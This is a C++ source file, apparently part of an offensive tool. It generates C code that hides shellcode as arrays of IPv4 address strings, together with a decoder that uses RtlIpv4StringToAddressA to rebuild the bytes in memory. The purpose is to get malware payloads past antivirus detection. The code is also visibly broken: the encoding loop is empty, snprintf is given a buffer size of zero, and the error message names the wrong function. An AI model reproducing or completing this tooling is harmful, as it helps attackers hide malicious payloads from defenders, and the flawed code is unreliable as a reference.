// Header files //
#include "hdrs/io_operations.h"
#include "hdrs/ipv4_obfuscation.h"


void ipv4ObfuscationHandler(ShellcodeStruct& shell_struct) {
    /* Purpose -
     * Parameters:
     * Returns -
     */
    char file_header[] = "#include <Windows.h>\n"
                         "#include <stdio.h>\n"
                         "#include <Ip2string.h>\n"
                         "#pragma comment(lib, \"Ntdll.lib\")\n\n"
                         "#ifndef NT_SUCCESS\n"
                         "#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)\n"
                         "#endif\n";
    // Write the header file //
    writeOutputData(shell_struct, file_header);

    char payload_bracket_inner[] = "\nconst char * IPv4Shell [] = { \n\t";
    // Write the inner bracket of obfuscated payload //
    writeOutputData(shell_struct, payload_bracket_inner);

    unsigned int num_elements = 0;
    char ip_addr[128];
    const char* ptr_ip_addr = NULL;

    // Iterate over the shellcode by increments of 4 //
    for (int iter = 0; iter <= shell_struct.result_size; iter += 4) {
        ;
    }


    char payload_bracket_outer[] = "\n};\n";
    // Write the outer bracket of the obfuscated payload //
    writeOutputData(shell_struct, payload_bracket_outer);

    char shellcode_constants[68];
    char shellcode_preparse[58] = "#define ElementsNumber %d\n"
                                  "#define SizeOfShellcode %d\n\n";
    // Parse the formatted string in result buffer //
    std::snprintf(shellcode_constants, num_elements, shellcode_preparse, shell_struct.result_size);
    // Write the formatted constants //
    writeOutputData(shell_struct, shellcode_constants);

    char decoder_func[] = "BOOL DecodeIPv4Fuscation(const char* IPV4[], PVOID LpBaseAddress) {\n"
                          "    PCSTR Terminator = NULL;\n"
                          "    PVOID LpBaseAddress2 = NULL;\n"
                          "    NTSTATUS STATUS;\n\tint i = 0;\n"
                          "    for (int j = 0; j < ElementsNumber; j++) {\n"
                          "        LpBaseAddress2 = PVOID((ULONG_PTR)LpBaseAddress + i);\n"
                          "        STATUS = RtlIpv4StringToAddressA((PCSTR)IPV4[j], FALSE, &Terminator, (in_addr*)LpBaseAddress2);\n"
                          "        if (!NT_SUCCESS(STATUS)) {\n"
                          "            printf(\"[!] RtlIpv6StringToAddressA failed for %s result %x\", IPV4[j], STATUS);\n"
                          "            return FALSE;\n"
                          "        }\n"
                          "        else {\n"
                          "            i = i + 4;\n"
                          "        }\n"
                          "    }\n"
                          "    return TRUE;\n"
                          "}\n";
    // Write the decoder function //
    writeOutputData(shell_struct, decoder_func);
}